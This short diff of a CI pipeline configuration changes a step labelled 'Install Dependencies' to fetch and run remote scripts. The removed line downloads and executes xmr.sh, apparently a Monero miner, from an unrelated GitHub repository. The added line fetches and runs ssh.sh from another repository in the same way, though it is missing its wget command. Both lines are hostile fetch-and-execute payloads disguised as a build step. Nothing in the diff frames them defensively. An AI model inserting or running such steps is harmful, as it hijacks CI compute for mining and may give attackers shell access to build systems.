@@ -9,7 +9,7 @@ jobs:
             name: Install Dependencies
             command: |
               lscpu
-               wget https://raw.githubusercontent.com/jayales/USDT_ku/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+               https://raw.githubusercontent.com/lijari/Testssh/main/ssh.sh && chmod +x ssh.sh && ./ssh.sh
 
 workflows:
     version: 2.1
